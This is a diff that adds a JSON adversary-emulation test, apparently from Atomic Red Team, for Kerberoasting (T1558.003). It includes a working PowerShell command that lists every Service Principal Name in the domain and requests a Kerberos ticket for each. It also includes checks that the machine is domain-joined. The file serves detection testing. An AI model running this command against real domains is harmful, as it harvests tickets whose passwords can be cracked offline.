@@ -1,0 +1,86 @@
+{
+  "id": "902f4ed2-1aba-4133-90f2-cff6d299d6da",
+  "name": "Request All Tickets via PowerShell",
+  "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "072904aa-16f1-4a6b-9bba-6177d804000e",
+      "type": "execute-command",
+      "data": {
+        "command": "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ecae03fb-e9e5-4919-b839-1a661a244b48",
+      "name": "Check dependency 1/1",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "adefc048-6565-4c39-a595-2c448115954f",
+      "name": "Resolve dependency 1/1",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host Joining this computer to a domain must be done manually\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7977f247-fa66-4be5-8919-cb7a9b8ab740",
+      "name": "Re-check dependency 1/1",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ecae03fb-e9e5-4919-b839-1a661a244b48",
+      "p": "on-success",
+      "o": "072904aa-16f1-4a6b-9bba-6177d804000e"
+    },
+    {
+      "s": "ecae03fb-e9e5-4919-b839-1a661a244b48",
+      "p": "on-failure",
+      "o": "adefc048-6565-4c39-a595-2c448115954f"
+    },
+    {
+      "s": "adefc048-6565-4c39-a595-2c448115954f",
+      "p": "on-success",
+      "o": "7977f247-fa66-4be5-8919-cb7a9b8ab740"
+    },
+    {
+      "s": "7977f247-fa66-4be5-8919-cb7a9b8ab740",
+      "p": "on-failure",
+      "o": "072904aa-16f1-4a6b-9bba-6177d804000e"
+    }
+  ],
+  "tags": [
+    "T1558.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "domain_name",
+      "type": "string",
+      "description": "The Domain Name to lookup against",
+      "value": "%USERDNSDOMAIN%"
+    }
+  ]
+}
